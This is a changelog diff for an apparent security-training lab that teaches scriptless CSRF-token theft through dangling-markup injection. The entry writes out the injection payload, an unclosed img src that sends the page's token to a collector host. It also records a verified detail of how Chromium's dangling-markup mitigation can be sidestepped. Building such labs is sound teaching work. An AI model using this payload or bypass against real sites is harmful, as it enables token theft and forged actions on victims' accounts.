@@ -6,6 +6,30 @@ All notable changes to this project are documented here. Format loosely follows
 
 ## [Unreleased]
 
+### track-xss-l-dangling — scriptless CSRF-token theft via dangling markup (expert)
+
+Prototyped in real Chromium 131 BEFORE building (Chrome's dangling-markup mitigation blocks newline-crossing
+subresource URLs). Built by hand, Docker-verified live. Flask (re-platformed from Go/Echo).
+
+- `dangling-markup-csrf-token-exfil` (**expert**): the staff `/page?u=` reflects `u` RAW into an UNQUOTED
+  attribute on a **single-line** template, under CSP `script-src 'none'` (no JS at all), with a hidden CSRF
+  token further along the same line. Injecting `x><img src='http://collector:9000/leak?d=` leaves a
+  single-quoted `src` OPEN that swallows the source line — including `value=<token>` — up to the next `'`; the
+  browser fetches it, leaking the token with **no script**. Leaked token → `POST /admin/action` → `/solve` →
+  flag. Teaches scriptless dangling-markup exfil (`script-src 'none'` stops `<script>`/`onerror` but not a
+  dangling `<img src>`); fix is encode + quote the reflection.
+- **Prototype finding (verified live, Chromium 131.0.6778.33):** Chrome's dangling-markup mitigation blocks a
+  subresource URL formed across a **newline**, but a single-line capture is sent normally — even with `<` in
+  the captured region (percent-encoded in the URL, doesn't trigger the block; the collector received the full
+  captured line incl. the token). So the lab renders the token region on one line; a newline between injection
+  and token would silently no-op — which is why prototype-first was mandatory.
+- Verified live: dangling capture fires at the real collector (`d=…value=<16hex>…`); flag == expected HMAC.
+  **Integrity:** `/page` 403 for the attacker (token not directly readable); a properly-TERMINATED `<img>`
+  beacons WITHOUT the token (isolates the dangling mechanism from "any image request"); `/admin/action` rejects
+  a wrong token. 3 services (app + bot + collector), egress-drop backend. app 142 MB, no baked flag, **Trivy
+  library + OS gates clean** (deps identical to csp-jsonp), drift-lint 46, prettier/catalog green.
+  CWE-79/CWE-201/OWASP-A03. `risk: low`. XSS 21/26 after merge.
+
 ### track-xss-k-cssinj — CSS-injection CSRF-token exfiltration (expert)
 
 A scriptless data-exfil lab: CSS attribute selectors leak a secret under a script-blocking CSP. Built by hand,
